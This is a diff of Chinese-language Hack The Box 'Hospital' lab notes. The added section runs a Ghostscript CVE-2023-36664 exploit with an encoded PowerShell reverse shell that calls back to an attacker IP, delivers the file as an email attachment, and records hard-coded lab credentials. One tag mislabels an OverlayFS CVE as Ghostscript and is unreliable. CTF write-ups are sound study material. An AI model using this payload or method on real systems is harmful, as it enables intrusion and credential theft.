@@ -575,7 +575,7 @@ The **-p** flag in the above command starts bash in "_privileged mode_". In simp
 ## Hint
 若Useragent是由客户端来处理的，那么可能在请求体内被过滤的操作在UA头内就可以绕过。
 sudo可以执行的脚本中带有‘./’路径的可执行文件，'./'一般指当前目录下的文件，但是在可执行文件中，这个当前目录指的就是执行该脚本的位置，你可以在你有权限读写的目录执行这个脚本，他会访问你当前目录下的指定文件，这样你就可以伪造文件了。
-# [HTB] Hospital
+# [HTB] Hospital #文件上传漏洞 
 ## Enumeration
 扫描端口：
 ![[Pasted image 20240407182439.png]]
@@ -608,7 +608,7 @@ VERSION_CODENAME=lunar
 ...
 ...
 ```
-找到[Issues · g1vi/CVE-2023-2640-CVE-2023-32629 --- 问题 ·g1vi/CVE-2023-2640-CVE-2023-32629 (github.com)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
+找到[Issues · g1vi/CVE-2023-2640-CVE-2023-32629 --- 问题 ·g1vi/CVE-2023-2640-CVE-2023-32629 (github.com)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) #Ghostscript命令注入漏洞
 进行EXP的利用，拿到rootshell:
 ![[Pasted image 20240407183625.png]]
 翻找home及root并未找到userflag
@@ -621,4 +621,20 @@ VERSION_CODENAME=lunar
 尝试rdp登录，失败。
 到443的webmail服务登录，成功。
 ![[Pasted image 20240407184000.png]]
-提到需要设计一个zh
+提到需要设计一个针管模型，要以eps格式发送，且会被GhoustScript可视化，搜索GhostScriptCVE:
+[jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) --- jakabakos/CVE-2023-36664-Ghostscript-command-injection：Ghostscript 命令注入漏洞 PoC （CVE-2023-36664） (github.com)](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/tree/main)
+```sh
+┌──(root㉿Cam311ia)-[~/WEBC/exp/CVE-2023-36664-Ghostscript-command-injection]
+└─# python3 exploit.py --generate --payload='powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAzACIALAA0ADIANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' --filename='imgay' --extension='eps'
+[+] Generated EPS payload file: imgay.eps
+```
+使用其生成一个epsshell（base64 powershell），设置好监听器，回复邮件并带上附件。
+等待一会，收到shell，在当前目录下有一个自动脚本，后半段会自动打开GhostScript执行我们的epsshell，前半段硬编码了一个凭证，用户是drbrown,密码为'chr!$br0wn'
+```powershell
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
+```
+用此凭证尝试rdp登录成功，拿到userflag.
+## Get Root Flag
+在收到的RDP界面，有一个powershell窗口在重复的执行selenium脚本，打开浏览器并登录webmail界面，输入Administrator及密码，使用这个凭证直接rdp登录拿到rootflag。
